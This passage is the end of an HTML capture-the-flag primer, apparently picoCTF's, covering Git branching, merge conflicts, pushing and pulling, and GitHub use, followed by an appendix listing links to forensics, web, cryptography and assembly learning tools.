                    </div>
                    <div class="paragraph">
                        <p>When merging 'C5' into the main branch at 'C2', the commit history of 'C5' will be merged as
                            well. If <code>$ git log</code> were to be run afterward, it would show a path from commit
                            'C4' to 'C5' to 'C3' to 'C2' to 'C1' and finally to the initial commit 'C0'.</p>
                    </div>
                    <div class="paragraph">
                        <p>Time travel can be tricky! But by keeping careful track of commits and their common
                            ancestors, we can branch and merge with confidence.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_merging">C.3. Merging</h3>
                    <div id="git-merging" class="paragraph">
                        <p>If you&#8217;re working with a 'remote' repository, such as one on GitHub, you can 'pull' or
                            'fetch' changes from the remote repository with <code>git pull</code>. This will download
                            any changes from the remote repository and merge them with your current branch. This is
                            known as 'fast-forwarding' because the changes are simply added to the end of your
                            branch&#8217;s commit history. It&#8217;s important to do this regularly to avoid merge
                            conflicts later!</p>
                    </div>
                    <div class="paragraph">
                        <p>A merge conflict is when two branches have changes on the same line. This can happen when
                            you&#8217;re working on your local machine or personal branch, and changes are made to the
                            original file before you merge back in. Fetching the latest changes helps ensure that any
                            differences are minimal. Ideally, conflicts can also be avoided by working on different
                            files or different lines of code on each branch.</p>
                    </div>
                    <div class="paragraph">
                        <p>However, if you do run into a merge conflict, Git will show you the difference between the
                            file on each branch and ask what you&#8217;d like to keep. You can then use a text editor to
                            delete the other change, or splice the changes together.</p>
                    </div>
                    <div class="paragraph">
                        <p>The start of the conflict is marked with <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</code>, and
                            the end of the conflict is marked with
                            <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt; &lt;branch name&gt;</code>. Somewhere in the middle will
                            be a <code>=======</code> which marks the division between the lines in each branch.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>It&#8217;ll be up to you to decide what to keep and what to delete. The markers from Git are
                            just there to help you find the conflict, and can be deleted once you&#8217;re done.</p>
                    </div>
                    <div class="paragraph">
                        <p>For example, if you had a file with the following contents:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ cat example.txt
This is a file to demonstrate merging.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And were working on two separate branches, one with the following changes:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git checkout cats
$ cat example.txt
Cats are very cute.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And another with the following changes:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git checkout dogs
$ cat example.txt
Dogs are very cute.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you try to merge the two branches together, you&#8217;d get the following error:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git merge cats
Auto-merging example.txt
CONFLICT (content): Merge conflict in example.txt
Automatic merge failed; fix conflicts and then commit the result.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This can be a scary message! But if you open the file, you&#8217;ll see the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ cat example.txt
This is a file to demonstrate merging.
&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
Dogs are very cute.
=======
Cats are very cute.
&gt;&gt;&gt;&gt;&gt;&gt;&gt; cats</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The first line is the original file, and the second line is the change from the
                            <code>dogs</code> branch. The third line is the change from the <code>cats</code> branch.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>To resolve this conflict, we&#8217;ll need to decide how to avoid example.txt from having two
                            different lines in the same place. We could delete one of the lines, or combine them
                            together. For example, we could change the file to the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ cat example.txt
This is a file to demonstrate merging.
Dogs and cats are very cute.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Once you&#8217;ve chosen the changes that will continue through the merge, you can add and
                            commit the file like normal, or use <code>git merge --continue</code>. You can also abort
                            the merge with <code>git merge --abort</code> if you&#8217;d like to start over. One more
                            useful tool is <code>git stash</code> which will save your current changes and allow you to
                            return to them later with <code>git stash pop</code>.</p>
                    </div>
                    <div class="paragraph">
                        <p>Afterward, your original branch will be updated with the changes from the other, merged
                            branch. Great job!</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_pulling_pushing">C.4. Pulling &amp; Pushing</h3>
                    <div class="paragraph">
                        <p>After finishing your changes and pulling and merging with the main branch, you can 'push'
                            your changes to be used by others, or yourself on a different device. If you&#8217;re
                            working on a cloned copy, you can use <code>git push</code> to send your commits to their
                            source, the remote repository.</p>
                    </div>
                    <div class="paragraph">
                        <p>If you&#8217;re working with files you&#8217;ve created locally, you&#8217;ll need to create
                            a remote repository to push to. This can be done with
                            <code>git remote add origin &lt;remote repository URL&gt;</code>. You can then push your
                            changes to the remote repository with <code>git push -u origin &lt;branch name&gt;</code>.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git push
$ git remote add origin &lt;remote repository URL&gt;
$ git push -u origin &lt;branch name&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>GitHub is a good tool to get comfortable with collaboration. 'Pull requests' are a way for
                            maintainers of a project to review your work and can help catch any errors that slipped past
                            what merge conflicts can catch. Sometimes, automated tests are run on the code as well to
                            make sure it&#8217;s ready to go into production!</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p>
                    </div>
                    <div class="paragraph">
                        <p>As a hacker, you&#8217;ll want to work closely with your team to make sure everyone is using
                            updated code, scripts, and programs as modifications are made to solve challenges. Be
                            careful of forcing changes with the <code>-f</code> flag as this can overwrite any work
                            that&#8217;s already been completed.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_review_of_git">C.5. Review of Git</h3>
                    <table id="git-review" class="tableblock frame-all grid-all stretch">
                        <caption class="title">Table 2. Basic Git commands</caption>
                        <colgroup>
                            <col style="width: 33.3333%;">
                            <col style="width: 33.3333%;">
                            <col style="width: 33.3334%;">
                        </colgroup>
                        <thead>
                            <tr>
                                <th class="tableblock halign-left valign-top">Operation</th>
                                <th class="tableblock halign-left valign-top">Shell example</th>
                                <th class="tableblock halign-left valign-top">Note</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">See Git options</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git --help</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Lists all the available commands and options for Git.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Start a repository</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git init</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">'Initialize' your current folder into a 'repository' where
                                        files and file changes can be tracked.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Stage a file</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git add .</code> or
                                        <code>$ git add &lt;file name&gt;</code>
                                    </p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">'Staging' a file means it will be added to your next commit.
                                    </p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Commit file(s)</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git commit -m "&lt;your description&gt;"</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">'Commit' your files to be saved. It&#8217;s a good habit to
                                        write short, helpful commit messages so that you and others can find your work
                                        easily later.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">See past commits</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git log</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">See past 'save points' and their commit IDs so you can go back
                                        to them.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Go to a past commit</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git checkout &lt;commit ID&gt;</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Return the repository to a past commit.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Combine commits together</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git merge &lt;branch or commit name&gt;</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Combine the work on different branches together. Be careful of
                                        merge conflicts! You&#8217;ll be prompted to choose which work should be brought
                                        forward.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Create a new branch</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git branch</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Create a new 'branch' of time. This new branch will start with
                                        the commit history of its parent branch, but once checked out, future commits
                                        will stay on that branch until merged.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Go to a new branch</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>git checkout &lt;branch name&gt;</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Like checking out a commit, this will return or forward your
                                        repository to the contents of the branch. Time travel!</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Pull a repository</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git pull &lt;repository&gt;</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Create or update a copy of a repository in your development
                                        environment.</p>
                                </td>
                            </tr>
                            <tr>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Push a repository</p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock"><code>$ git push</code></p>
                                </td>
                                <td class="tableblock halign-left valign-top">
                                    <p class="tableblock">Send your updates back to the remote repository so that you
                                        and/or others can access them. If your local branch has no remote equivalent,
                                        you&#8217;ll be asked to specify where your commits should be sent.</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="paragraph">
                        <p>If you want more practice, I (Jeffery), recommend <em>Oh My Git!</em>, an open source game
                            with interactive visualizations and commands.</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image51.png" alt="image51">
                        </div>
                        <div class="title">Figure 67. Oh My Git!, <a href="https://ohmygit.org" target="_blank"
                                rel="noopener">https://ohmygit.org</a></div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_using_github">C.6. Using GitHub</h3>
                    <div id="github" class="paragraph">
                        <p>GitHub has many features on top of Git to help when writing code and working with files. For
                            example, while it&#8217;s important to be comfortable with the shell when working with Git
                            and when hacking, GitHub provides a <a href="https://desktop.github.com" target="_blank"
                                rel="noopener">Desktop client</a> that can be a convenient GUI for common workflows.
                            They also have a <a href="https://github.com/mobile" target="_blank" rel="noopener">mobile
                                app</a>, <a href="https://github.com/features/codespaces" target="_blank"
                                rel="noopener">cloud dev environments</a>, and <a
                                href="https://github.com/features/security" target="_blank" rel="noopener">automated
                                security scans</a>.</p>
                    </div>
                    <div class="paragraph">
                        <p>As a student, a great place to start is the <a href="https://education.github.com/pack"
                                target="_blank" rel="noopener">GitHub Student Developer Pack</a>, which offers many free
                            resources and further tutorials.</p>
                    </div>
                    <div class="paragraph">
                        <p>As a collaboration tool, GitHub allows you to create public 'open source' repositories and
                            join discussions or contribute code to others. You can even find the code for picoCTF and
                            add to this primer! <a href="https://github.com/picoCTF" target="_blank"
                                rel="noopener">https://github.com/picoCTF</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Many open source repositories will include a CONTRIBUTING.md file that discusses what help
                            they&#8217;re looking for. More discussion and best practices for the open source community
                            can be found at <a href="https://opensource.guide" target="_blank"
                                rel="noopener">https://opensource.guide</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Just make sure, as a hacker and competitor, that you&#8217;re allowed to publish what
                            you&#8217;re working on to a public repository! Many competitons, including picoCTF, ask
                            that files related to competition are kept secret for some time in order to ensure fairness.
                            Check public repositories for licenses as well, which will detail how their code can be
                            used.</p>
                    </div>
                    <div class="paragraph">
                        <p>We hope you join our community!</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_tools">Appendix D: Tools</h2>
            <div class="sectionbody">
                <h5 id="tools" class="discrete">Jeffery John</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>Throughout this Primer, we&#8217;ve recommended a number of tools to help you get started with
                        hacking. Here they are, all in one place!</p>
                </div>
                <div class="sect2">
                    <h3 id="_general">D.1. General</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>picoCTF Webshell: <a href="https://webshell.picoctf.org" target="_blank"
                                        rel="noopener">https://webshell.picoctf.org</a></p>
                            </li>
                            <li>
                                <p>Git: <a href="https://git-scm.com" target="_blank"
                                        rel="noopener">https://git-scm.com</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_forensics_2">D.2. Forensics</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>The Sleuth Kit: <a href="https://www.sleuthkit.org/sleuthkit" target="_blank"
                                        rel="noopener">https://www.sleuthkit.org/sleuthkit</a></p>
                            </li>
                            <li>
                                <p>Wireshark: <a href="https://www.wireshark.org" target="_blank"
                                        rel="noopener">https://www.wireshark.org</a></p>
                            </li>
                            <li>
                                <p>Python: <a href="https://www.python.org/about/gettingstarted" target="_blank"
                                        rel="noopener">https://www.python.org/about/gettingstarted</a></p>
                            </li>
                            <li>
                                <p>ASCII Table: <a href="https://www.asciitable.com" target="_blank"
                                        rel="noopener">https://www.asciitable.com</a></p>
                            </li>
                            <li>
                                <p>Pwntools: <a href="http://docs.pwntools.com/en/stable" target="_blank"
                                        rel="noopener">http://docs.pwntools.com/en/stable</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_web_exploitation">D.3. Web Exploitation</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>W3 Schools: <a href="https://www.w3schools.com" target="_blank"
                                        rel="noopener">https://www.w3schools.com</a></p>
                            </li>
                            <li>
                                <p>Firefox: <a href="https://www.mozilla.org/en-US/firefox/new" target="_blank"
                                        rel="noopener">https://www.mozilla.org/en-US/firefox/new</a></p>
                            </li>
                            <li>
                                <p>Burp Suite: <a href="https://portswigger.net/burp" target="_blank"
                                        rel="noopener">https://portswigger.net/burp</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_cryptography_2">D.4. Cryptography</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>Vigenre Cracking Tool: <a
                                        href="https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html"
                                        target="_blank"
                                        rel="noopener">https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html</a>
                                </p>
                            </li>
                            <li>
                                <p>Extended Euclidean algorithm: <a href="https://planetcalc.com/3298" target="_blank"
                                        rel="noopener">https://planetcalc.com/3298</a></p>
                            </li>
                            <li>
                                <p>Integer factorization calculator: <a href="https://www.alpertron.com.ar/ECM.HTM"
                                        target="_blank" rel="noopener">https://www.alpertron.com.ar/ECM.HTM</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_databases">D.5. Databases</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>MySQL: <a href="https://paiza.io/en/projects/new?language=mysql" target="_blank"
                                        rel="noopener">https://paiza.io/en/projects/new?language=mysql</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_assembly_2">D.6. Assembly</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>Intel assembly: <a
                                        href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about"
                                        target="_blank"
                                        rel="noopener">https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about</a>
                                </p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_git">D.7. Git</h3>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>Git: <a href="https://git-scm.com" target="_blank"
                                        rel="noopener">https://git-scm.com</a></p>
                            </li>
                            <li>
                                <p>Git Cheat Sheet: <a href="https://education.github.com/git-cheat-sheet-education.pdf"
                                        target="_blank"
                                        rel="noopener">https://education.github.com/git-cheat-sheet-education.pdf</a>
                                </p>
                            </li>
                            <li>
                                <p>Oh My Git!: <a href="https://ohmygit.org" target="_blank"
                                        rel="noopener">https://ohmygit.org</a></p>
                            </li>
                            <li>
                                <p>GitHub: <a href="https://github.com" target="_blank"
                                        rel="noopener">https://github.com</a></p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="footnotes">
        <hr>
        <div class="footnote" id="_footnotedef_1">
            <a href="#_footnoteref_1">1</a>. <a href="https://en.wikipedia.org/wiki/Coprime_integers"><span
                    class="underline">https://en.wikipedia.org/wiki/Coprime_integers</span></a>
        </div>
    </div>
    <div id="footer">
        <div id="footer-text">
            Last updated 2023-12-22 14:39:55 -0500
        </div>
    </div>
</body>

</html>